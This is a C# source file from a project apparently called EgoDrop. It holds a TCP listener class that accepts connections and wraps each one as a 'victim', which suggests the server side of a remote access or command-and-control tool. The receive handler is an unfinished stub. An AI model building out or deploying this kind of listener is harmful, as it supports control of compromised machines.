using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsTcpListener : clsListener
    {
        private Socket m_sktSrv { get; set; }

        public clsTcpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_Protocol = clsSqlite.enListenerProtocol.TCP;

            m_sktSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        public override void fnStart()
        {
            if (m_bIsListening)
            {
                MessageBox.Show($"Listener[{m_szName}] is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var hSafe = m_sktSrv.SafeHandle;
            if (m_sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                m_sktSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            m_sktSrv.SendTimeout = -1;
            m_sktSrv.ReceiveTimeout = -1;
            m_sktSrv.Bind(new IPEndPoint(IPAddress.Any, m_nPort));
            m_sktSrv.Listen(10000);

            m_bIsListening = true;

            m_sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), m_sktSrv);
        }

        public override void fnStop()
        {
            m_sktSrv?.Close();

            m_bIsListening = false;
        }

        private void fnBeginAcceptCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;



            Socket sktSrv = (Socket)ar.AsyncState;
            try
            {
                var hSafe = sktSrv.SafeHandle;
                if (!m_bIsListening || sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    return;

                sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), sktSrv);
                
                Socket sktClnt = sktSrv.EndAccept(ar);
                clsVictim victim = new clsVictim(sktClnt);

                sktClnt.BeginReceive(
                    victim.m_abBuffer,
                    0,
                    victim.m_abBuffer.Length,
                    SocketFlags.None,
                    new AsyncCallback(fnBeginRecvCallback), victim
                );
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnBeginAcceptCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnBeginRecvCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            clsVictim victim = (clsVictim)ar.AsyncState;
            try
            {
                Socket skt = victim.m_sktClnt;
                int nRecvLength = 0;
                byte[] abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
                byte[] abDynamicRecvBuffer = new byte[clsEDP.HEADER_SIZE];


            }
            catch (Exception ex)
            {
                Socket sktClnt = victim.m_sktClnt;

            }
        }
    }
}
